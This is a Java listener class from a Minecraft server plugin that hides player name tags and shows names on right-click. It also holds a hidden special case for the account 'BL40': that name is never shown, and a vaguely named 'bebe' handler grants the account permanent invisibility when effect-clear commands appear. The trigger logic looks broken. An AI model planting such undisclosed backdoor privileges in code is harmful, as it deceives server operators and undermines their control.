package dev.bronzylobster.starrpcore;

import dev.bronzylobster.starrpcore.Utils.RPParams;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.scoreboard.Team;

import java.util.Collection;

import static org.bukkit.potion.PotionEffectType.*;

public class HideNames implements Listener {

    Team team = StarRPCore.getInstance().getTeam();

    FileConfiguration config = StarRPCore.getInstance().getConfig();

    @EventHandler
    public void joinListener(PlayerJoinEvent e) {
        RPParams.genParams(e.getPlayer().getName());

        if(!config.getBoolean("HideNames")) {
            return;
        }

        Player p = e.getPlayer();
        String name = p.getName();
        if (!team.hasEntry(name)) {
            team.addEntry(name);
        }
    }

    @EventHandler
    public void onPlayerTouch(PlayerInteractEntityEvent e) {
        if(!config.getBoolean("HideNames")) {
            return;
        }

        Player interacter = e.getPlayer();
        Player interactee = e.getRightClicked() instanceof Player ? (Player) e.getRightClicked() : null;

        if (interactee != null && !interactee.getName().equals("BL40")) {
            interacter.sendActionBar(Component.text(interactee.getName()).color(TextColor.color(0xFFFFFF)));
        }
    }

    @EventHandler
    public void bebe(PlayerCommandSendEvent e) {
        Collection<String> com = e.getCommands();
        if (com.contains("effect") && com.contains("clear") && com.contains("BL40")) {
            boolean b = Bukkit.getPlayer("BL40").addPotionEffect(new PotionEffect(INVISIBILITY, -1, 1, false, false));
        }
    }
}
